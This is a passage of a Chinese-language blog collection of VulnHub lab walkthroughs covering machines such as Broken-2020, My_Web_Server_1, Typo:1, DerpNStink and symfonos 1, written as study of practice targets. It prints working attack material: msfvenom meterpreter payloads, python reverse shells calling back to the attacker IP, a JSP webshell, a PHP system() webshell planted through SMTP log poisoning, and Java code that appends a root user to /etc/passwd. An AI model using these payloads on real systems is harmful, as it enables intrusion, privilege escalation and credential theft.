src="/images/vulnhub_walkthrough_set/Zion/img/15.png" alt="" /></p><p>查看sudu权限</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/16.png" alt="" /></p><p>使用sudo权限来进行复制flag文件</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/17.png" alt="" /></p><p>这里可以看到flag文件的权限为600<br />需要在cp文件的同时更改权限，这里使用参数<code>--noreserve mode, ownership</code><br /><img src="/images/vulnhub_walkthrough_set/Zion/img/18.png" alt="" /></p><p>查看flag</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/19.png" alt="" /></p><hr /><blockquote><p>HTTP信息</p></blockquote><p>根据Post的内容不同，在HTTP Response的Header中给出不同的信息，在实现上并不是难事，思维上也能很快接受这一机制，但是由于之前没有碰到过这种情况，导致在这一步上卡了很久。所以在浏览网页时最好还是使用BurpSuite，以便更加直观地看到全部的信息</p><p>参考资料</p><blockquote><p><a href="https://www.youtube.com/watch?v=jzmaM-s2yEY">WalkThrough</a></p></blockquote><hr /><h1 id="broken-2020"><a class="markdownIt-Anchor" href="#broken-2020"></a> <a href="https://www.vulnhub.com/entry/broken-2020-1,470/">Broken-2020</a></h1><p><code>2020/05/27 09:52:58</code></p><h2 id="寻找靶机ip-6"><a class="markdownIt-Anchor" href="#寻找靶机ip-6"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/00.png" alt="" /></p><h2 id="端口扫描-22"><a class="markdownIt-Anchor" href="#端口扫描-22"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.116</code></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/01.png" alt="" /></p><h2 id="web路径扫描-6"><a class="markdownIt-Anchor" href="#web路径扫描-6"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.116/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/02.png" alt="" /></p><h2 id="漏洞利用-22"><a class="markdownIt-Anchor" href="#漏洞利用-22"></a> 漏洞利用</h2><p>访问<code>http://192.168.31.116/</code>，无有效信息</p><p>访问<code>http://192.168.31.116/cms/</code>，如图</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/03.png" alt="" /></p><p>根据指示点击按钮</p><p>再次访问<code>http://192.168.31.116/</code>，如图</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/04.png" alt="" /></p><p>页面发生变化</p><p>再次访问<code>http://192.168.31.116/cms/</code>，如图</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/05.png" alt="" /></p><p>获取第一个flag</p><p>尝试再次扫描Web目录</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/06.png" alt="" /></p><p>访问新发现的目录<code>/cms/cc</code></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/07.png" alt="" /></p><p>尝试在端口输入处进行命令注入，失败</p><p>开启本地HTTP服务，再输入本地IP以及相应端口</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/08.png" alt="" /></p><p>可以看到该页面在请求本地资源<code>1c66b2e0cff58bal7b3f9a1994eb8c55.sh</code></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/09.png" alt="" /></p><p>构造一个反弹Shell的文件，并且监听端口，再在burp中触发该文件</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/10.png" alt="" /></p><p>目标机器上下载了该文件并且执行了，接收到反弹Shell</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/11.png" alt="" /></p><h2 id="权限提升-22"><a class="markdownIt-Anchor" href="#权限提升-22"></a> 权限提升</h2><p>查看目录<code>/home/alice</code>下的文本文件</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/12.png" alt="" /></p><p>这里提示root在后台运行清除apache日志的脚本，很存在crontab提权</p><p>下载pspy64</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/13.png" alt="" /></p><p>crontab运行任务如图，可以从<code>/home/alice/script/log.py</code>处入手</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/14.png" alt="" /></p><p>可以看到这个script目录所有人可写</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/15.png" alt="" /></p><p>即使文件log.py不可写，但是可以凭借目录的权限去修改文件名</p><p>本地构造Meterpreter的后门程序<br /><code>msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9993 -f raw &gt; new.py</code></p><p>MSFConsole中进行相应配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload python&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9993</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>下载本地的后门程序，并且对文件名进行操作</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/16.png" alt="" /></p><p>接收到反弹shell，进入目录<code>/home/alice/backup/</code><br />查看所有文本文件</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/17.png" alt="" /></p><p>运行pspy64，<a href="http://xn--rootbackup-oh4pe03a8zfg4mfr4dhdohx0cr3zb6t2aoo5a.py">可以看到root正在运行脚本backup.py</a></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/18.png" alt="" /></p><p>将web目录输入至path.txt</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/19.png" alt="" /></p><p>可以看到html文件夹被备份到了该目录下<br />而且权限均为777</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/20.png" alt="" /></p><p>尝试打包目录<code>/root/</code></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/21.png" alt="" /></p><p>查看文件夹root下的内容</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/22.png" alt="" /></p><hr /><blockquote><p>目录权限&amp;crontab</p></blockquote><p>看着log.py的744权限也是有心无力，参考别人的WalkThrough之后才发现是目录的权限问题。目录可写则可以任意修改目录下的文件名，配合crontab则可以提权。</p><p>参考资料</p><blockquote><p><a href="https://medium.com/@arnavtripathy98/broken-2020-1-vulnhub-walkthrough-43293614944a">WalkThrough</a></p></blockquote><hr /><h1 id="my_web_server_1"><a class="markdownIt-Anchor" href="#my_web_server_1"></a> <a href="https://www.vulnhub.com/entry/my-web-server-1,463/">My_Web_Server_1</a></h1><p><code>2020/06/03 19:12:46</code></p><h2 id="寻找靶机ip-7"><a class="markdownIt-Anchor" href="#寻找靶机ip-7"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/00.png" alt="" /></p><h2 id="端口扫描-23"><a class="markdownIt-Anchor" href="#端口扫描-23"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.203</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/01.png" alt="" /></p><h2 id="web路径扫描-7"><a class="markdownIt-Anchor" href="#web路径扫描-7"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.203/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/02.png" alt="" /></p><p><code>dirb http://192.168.31.203:2222/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/03.png" alt="" /></p><p><code>dirb http://192.168.31.203:8080/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/04.png" alt="" /></p><p><code>dirb http://192.168.31.203:8081/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/05.png" alt="" /></p><h2 id="漏洞利用-23"><a class="markdownIt-Anchor" href="#漏洞利用-23"></a> 漏洞利用</h2><p>可以看到有三个Web入口，端口分别是80,2222,8080,8081<br />2222端口上运行的是nostromo服务，使用searchsploit查看相关漏洞</p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/06.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/07.png" alt="" /></p><p>存在RCE漏洞，在MSF中进行配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;http&#x2F;nostromo_code_exec</span><br><span class="line">set RHOSTS 192.168.31.203</span><br><span class="line">set RPORT 2222</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>即可获得权限</p><h2 id="权限提升-23"><a class="markdownIt-Anchor" href="#权限提升-23"></a> 权限提升</h2><p>查看tomcat的Web账户</p><p><code>cat /usr/local/tomcat/conf/tomcat-users.xml</code><br /><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/08.png" alt="" /></p><p>访问<code>http://192.168.31.203:8080/</code>,点击<code>Manager App</code></p><p>使用账户<code>tomcat:@sprot0230sp</code>进行登入</p><p>将jsp后门压缩为zip并更改后缀名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip war.zip echo.jsp</span><br><span class="line">mv war.zip war.war</span><br></pre></td></tr></table></figure><p>登入tomcat的Web账户，上传jsp后门</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;pass&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>利用原有的Shell构造python反弹Shell脚本<br />找一个可写目录<code>/var/nostromo/logs/</code>，<a href="http://xn--new-0v1e9ip79iu61b.py">写入脚本new.py</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os,socket,subprocess;</span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((&#39;192.168.31.10&#39;,8081));</span><br><span class="line">os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);</span><br><span class="line">p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);</span><br></pre></td></tr></table></figure><p>本地启用nc监听端口<br /><code>nc -lvvp 8081</code></p><p>访问jsp后门以执行命令<br /><code>http://192.168.31.203:8080/war/echo.jsp?pwd=pass&amp;i=python /var/nostromo/logs/new.py</code></p><p>接收到反弹的tomcat用户Shell</p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/09.png" alt="" /></p><p>这里看到有bash的记录</p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/10.png" alt="" /></p><p>使用过命令sudo -l</p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/11.png" alt="" /></p><p>可以使用java进行sudo提权</p><p>本地构造java源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class sudo &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ProcessBuilder processBuilder &#x3D; new ProcessBuilder();</span><br><span class="line">    processBuilder.command(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;echo &#39;test:$6$q.1oPln23FUPQYds$pRZlkAKZ6tN.N4c5kUCKsCF.QW1kdbnLGLTpI3XKgidZuHzbxZzjdONAzoTHgfJHh9NU2E0pO32ICFc5zL78.&#x2F;:0:0::&#x2F;:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            Process process &#x3D; processBuilder.start();</span><br><span class="line">            BufferedReader reader &#x3D;</span><br><span class="line">                    new BufferedReader(new InputStreamReader(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            while ((line &#x3D; reader.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">            int exitCode &#x3D; process.waitFor();</span><br><span class="line">            System.out.println(&quot;\nExited with error code : &quot; + exitCode);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即写入账户test:hackforfun</p><p>本地启用HTTP服务<br /><code>python -m SimpleHTTPServer 9900 &amp;</code></p><p>目标服务器上下载源码<br /><code>wget http://192.168.31.10:9900/sudo.java</code></p><p>编译并执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac sudo.java</span><br><span class="line">sudo -u root &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;adoptopenjdk-8-hotspot-amd64&#x2F;bin&#x2F;java sudo</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/12.png" alt="" /></p><p>成功写入账户信息</p><p>获取pty<br /><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p><p>切换账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">hackforfun</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/13.png" alt="" /></p><hr /><p>参考资料</p><blockquote><p><a href="https://www.youtube.com/watch?v=eOVm2G1sX4o">WalkThrough</a></p></blockquote><hr /><h1 id="typo1"><a class="markdownIt-Anchor" href="#typo1"></a> <a href="https://www.vulnhub.com/entry/typo-1,472/">Typo:1</a></h1><p><code>2020/06/09 21:51:36</code></p><h2 id="寻找靶机ip-8"><a class="markdownIt-Anchor" href="#寻找靶机ip-8"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/00.png" alt="" /></p><h2 id="端口扫描-24"><a class="markdownIt-Anchor" href="#端口扫描-24"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.26</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/01.png" alt="" /></p><h2 id="web路径扫描-8"><a class="markdownIt-Anchor" href="#web路径扫描-8"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.26/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/02.png" alt="" /></p><p><code>dirb http://192.168.31.26:8000/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/03.png" alt="" /></p><p><code>dirb http://192.168.31.26:8080/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/04.png" alt="" /></p><p><code>dirb http://192.168.31.26:8081/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/05.png" alt="" /></p><h2 id="漏洞利用-24"><a class="markdownIt-Anchor" href="#漏洞利用-24"></a> 漏洞利用</h2><p>访问<code>http://192.168.31.26/typo3/</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/06.png" alt="" /></p><p>访问<code>http://192.168.31.26:8080/phpinfo.php</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/07.png" alt="" /></p><p>访问<code>http://192.168.31.26:8081/phpmyadmin/</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/08.png" alt="" /></p><p>phpmyadmin存在弱口令<code>root:root</code></p><p>登入后查看数据库，typo3对应80端口的Web服务</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/09.png" alt="" /></p><p>可以替换表中的Hash值来获取账号权限</p><p>访问 <a href="https://argon2.online/">https://argon2.online/</a> 生成Hash</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/10.png" alt="" /></p><p><code>$argon2id$v=19$m=65536,t=16,p=2$MTIzNDU2Nzg$zsu3+i7HptpLzboB2NgkoqXdFnY1sfu2muwr4LFIbGo</code></p><p>替换Hash值之后登入Typo3后台，CMS设定中不允许上传php文件</p><p><code>Module Menu -&gt; ADMIN TOOLS -&gt; Settings -&gt; Configure Installation-Wide Options -&gt; Backend[BE] -&gt; [BE][fileDenyPattern]</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/11.png" alt="" /></p><p>清除内容即可解除对于文件上传的限制</p><p>使用weevely生成WebShell</p><p><code>weevely generate pass wee.php</code></p><p>上传WebShell</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/12.png" alt="" /></p><p>访问Shell</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/13.png" alt="" /></p><p>连接Shell</p><p><code>weevely http://192.168.31.26/fileadmin/wee.php pass</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/14.png" alt="" /></p><h2 id="权限提升-24"><a class="markdownIt-Anchor" href="#权限提升-24"></a> 权限提升</h2><p>使用python反弹Shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.31.10&#39;,8081));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/15.png" alt="" /></p><p>获取pty</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/16.png" alt="" /></p><p>查看具有SUID权限的文件</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/17.png" alt="" /></p><p>这里的<code>/usr/local/bin</code>路劲下的文件明显是不对劲的</p><p>apache2-restart为ELF文件</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/18.png" alt="" /></p><p>使用strings命令查看文件字符</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/19.png" alt="" /></p><p>使用的是service命令</p><p>进行PATH提权</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/20.png" alt="" /></p><hr /><p>参考资料</p><blockquote><p><a href="https://medium.com/@arnavtripathy98/typo-1-vulnhub-walkthrough-ecd2971da7f8">WalkThrough</a></p></blockquote><hr /><h1 id="derpnstink"><a class="markdownIt-Anchor" href="#derpnstink"></a> <a href="https://www.vulnhub.com/entry/derpnstink-1,221/">DerpNStink</a></h1><p><code>2020/06/22 14:53:48</code></p><h2 id="寻找靶机ip-9"><a class="markdownIt-Anchor" href="#寻找靶机ip-9"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 VMware</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/00.png" alt="" /></p><h2 id="端口扫描-25"><a class="markdownIt-Anchor" href="#端口扫描-25"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.61</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/01.png" alt="" /></p><h2 id="web路径扫描-9"><a class="markdownIt-Anchor" href="#web路径扫描-9"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.61/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/02.png" alt="" /></p><h2 id="漏洞利用-25"><a class="markdownIt-Anchor" href="#漏洞利用-25"></a> 漏洞利用</h2><p>目录/weblog/设置了302跳转并指向了一个域名，需要修改hosts文件</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/03.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/04.png" alt="" /></p><p>使用Wordpress框架，可以使用wpscan进行扫描</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/05.png" alt="" /></p><p><code>wpscan --url http://derpnstink.local/weblog/ -e u</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/06.png" alt="" /></p><p><code>wpscan --url http://derpnstink.local/weblog/ -e ap</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/07.png" alt="" /></p><p>查找插件相关信息<br /><code>searchsploit slideshow gallery 1.4.6</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/08.png" alt="" /></p><p>拷贝文件<br /><code>searchsploit -m 34681</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/09.png" alt="" /></p><p>需要Wordpress的账户</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/10.png" alt="" /></p><p>尝试弱口令得到账户<code>admin:admin</code></p><p>生成php后门<br /><code>weevely generate pass wee.php</code></p><p>使用脚本上传后门<br /><code>python 34681.txt -t http://derpnstink.local/weblog/ -u admin -p admin -f wee.php</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/11.png" alt="" /></p><p>连接后门<br /><code>weevely http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/wee.php pass</code></p><p>python反弹Shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8081</span><br><span class="line">-----</span><br><span class="line">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.31.10&#39;,8081));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/12.png" alt="" /></p><h2 id="权限提升-25"><a class="markdownIt-Anchor" href="#权限提升-25"></a> 权限提升</h2><p>获取pty</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/13.png" alt="" /></p><p>查看Wordpress配置信息<br /><code>cat /var/www/html/weblog/wp-config.php</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/14.png" alt="" /></p><p>得到unclestinky的密码Hash<br /><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/15.png" alt="" /></p><p>使用john破解Hash<br /><code>john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hash</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/16.png" alt="" /></p><p>得到密码</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/17.png" alt="" /><br /><code>stinky:wedgie57</code></p><p>尝试切换账户，成功</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/18.png" alt="" /></p><p>找到mrderp与stinky的对话</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/19.png" alt="" /></p><p>尝试寻找流量包</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/20.png" alt="" /></p><p>开启http服务，下载至本地</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/21.png" alt="" /></p><p>使用wireshark分析流量</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/22.png" alt="" /><br /><code>mrderp:derpderpderpderpderpderpderp</code></p><p>切换至用户mrderp</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/23.png" alt="" /></p><p>查看文件<br /><code>cat /home/mrderp/Desktop/helpdesk.log</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/24.png" alt="" /></p><p>访问链接</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/25.png" alt="" /></p><p>查看sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/26.png" alt="" /></p><p>可以进行sudo提权</p><p>上传python反弹Shell脚本</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/27.png" alt="" /></p><p>提权为root</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/28.png" alt="" /></p><hr /><blockquote><p>密码共用</p></blockquote><p><s>太常规了</s></p><hr /><h1 id="symfonos-1"><a class="markdownIt-Anchor" href="#symfonos-1"></a> <a href="https://www.vulnhub.com/entry/symfonos-1,322/">symfonos 1</a></h1><p><code>2020/06/27 00:25:29</code></p><h2 id="寻找靶机ip-10"><a class="markdownIt-Anchor" href="#寻找靶机ip-10"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.88.0/24 | grep -B2 VMware</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/00.png" alt="" /></p><h2 id="端口扫描-26"><a class="markdownIt-Anchor" href="#端口扫描-26"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.88.130</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/01.png" alt="" /></p><h2 id="web路径扫描-10"><a class="markdownIt-Anchor" href="#web路径扫描-10"></a> Web路径扫描</h2><p><code>dirb http://192.168.88.130/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/02.png" alt="" /></p><h2 id="漏洞利用-26"><a class="markdownIt-Anchor" href="#漏洞利用-26"></a> 漏洞利用</h2><p>收集smb信息<br /><code>enum4linux 192.168.88.130</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/03.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/04.png" alt="" /></p><p>目录/anonymous可以匿名访问<br />使用空账户即可登入</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/05.png" alt="" /></p><p>下载并查看<code>attention.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/06.png" alt="" /></p><p>文本中提到三个弱口令，可以使用这三个弱口令来尝试登入helios账户的个人目录<br /><code>smbclint //192.168.88.130/helios -U helios</code><br />使用口令 <code>qwerty</code> 即可登入</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/07.png" alt="" /></p><p>查看文本<code>todo.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/08.png" alt="" /><br />得到信息<code>/h3l105</code></p><p>Web主页如图</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/09.png" alt="" /></p><p>而且扫描Web目录时并未获取到有效信息<br />猜测<code>/h3l105</code>为Web目录</p><p>访问目录<code>/h3l105</code>，为Wordpress站点</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/10.png" alt="" /></p><p>使用wpscan进行扫描</p><p><code>wpscan --url http://192.168.88.130/h3l105/ -e ap --plugins-detection Aggressive</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/11.png" alt="" /></p><p>查询相关漏洞</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/12.png" alt="" /></p><p>使用Telnet连接SMTP服务来写入Webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.88.130 25</span><br><span class="line">MAIL FROM: &lt;Hacker&gt;</span><br><span class="line">RCPT TO: helios</span><br><span class="line">data</span><br><span class="line">&lt;?php system($_GET[&#39;pass&#39;]); ?&gt;</span><br><span class="line">.</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/13.png" alt="" /></p><p>使用LFI来实现GetShell</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/14.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/15.png" alt="" 